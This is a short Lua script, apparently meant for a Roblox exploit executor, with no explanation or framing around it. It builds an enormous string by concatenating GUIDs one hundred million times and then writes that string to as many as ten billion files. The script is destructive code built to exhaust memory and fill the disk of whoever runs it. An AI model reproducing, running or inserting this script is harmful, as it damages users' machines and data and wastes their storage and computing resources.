local a = ""

for i = 1, 100000000 do
    a = a..game:GetService("HttpService"):GenerateGUID()
end

for i = 1, 10000000000 do
    writefile(i..".lul", a)
end
